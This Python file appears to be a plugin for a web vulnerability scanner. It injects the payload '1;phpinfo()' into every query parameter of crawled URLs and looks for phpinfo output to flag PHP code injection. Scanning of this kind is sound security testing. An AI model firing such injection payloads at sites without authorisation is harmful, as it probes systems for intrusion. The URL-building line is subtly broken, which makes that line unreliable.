import re
from urllib.parse import parse_qsl, urlencode, urlsplit

from lib.utils.container import Services
from .. import AttackPlugin


class Php(AttackPlugin):
    def process(self, start_url, crawled_urls):
        output = Services.get("output")
        request = Services.get("request_factory")

        output.info("Checking php code injection...")
        payload = "1;phpinfo()"
        try:
            for url in crawled_urls:

                # Current request parameters
                params = dict(parse_qsl(urlsplit(url).query))
                # Change the value of the parameters with the payload
                tainted_params = {x: payload for x in params}

                if len(tainted_params) > 0:
                    # Prepare the attack URL
                    attack_url = urlsplit(url).geturl() + urlencode(tainted_params)
                    output.debug("Testing: %s", attack_url)
                    resp = request.send(
                        url=attack_url, method="GET", payload=None, headers=None
                    )
                    if resp.status_code == 200:
                        if re.search(
                            r'<title>phpinfo[()]</title>|<h1 class="p">PHP Version (.*?)</h1>',
                            resp.text,
                        ):
                            output.finding(
                                "That site is may be vulnerable to PHP Code Injection at %s"
                                % url
                            )
        except Exception as e:
            output.error("Error occured\nAborting this attack...\n")
            output.debug("Traceback: %s", e)
            return
